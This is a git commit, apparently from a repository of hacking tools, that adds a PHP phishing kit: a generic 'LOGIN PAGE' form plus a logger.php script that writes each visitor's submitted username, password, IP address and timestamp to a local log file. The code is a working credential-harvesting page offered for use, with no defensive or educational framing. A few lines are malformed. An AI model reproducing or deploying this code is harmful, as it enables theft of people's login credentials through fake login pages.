e73eb2ff43f0889607f3a467f500494c8827c943
hackersprograms <44770506+hackersprograms@users.noreply.github.com>
2018-11-08 18:29:47 +0300

    Add files via upload

---
+++ html/index.php
@@ -0,0 +1,16 @@
+<?php
+include "logger.php";
+?>
+<html>
+
+<center>
+<h1>LOGIN PAGE</h1>
+<form action=""method="POST"> 
+<input type="text" name="username" value""/>
+<input type="text" name="password" value=""/>
+<input type="submit" name="submit" value="submit"/>
+</form>
+</center/
+
+
+</html>
---
+++ html/logger.php
@@ -0,0 +1,14 @@
+<?php
+$user = $_POST['username'];
+$pass = $_POST['password'];
+$ip = getenv('REMOTE_ADDR');
+$tarih = date("Y/m/d h:i:s");
+$dosya = fopen('log', 'a');
+fwrite($dosya, "IP       : " . $ip . "\r\n");
+fwrite($dosya, "Date     : " . $tarih . "\r\n");
+fwrite($dosya, "Username : " . $user . "\r\n");
+fwrite($dosya, "Password : " . $pass . "\r\n");
+fwrite($dosya, "------------------------------- " . "\r\n");
+fwrite($dosya);
+
+?>
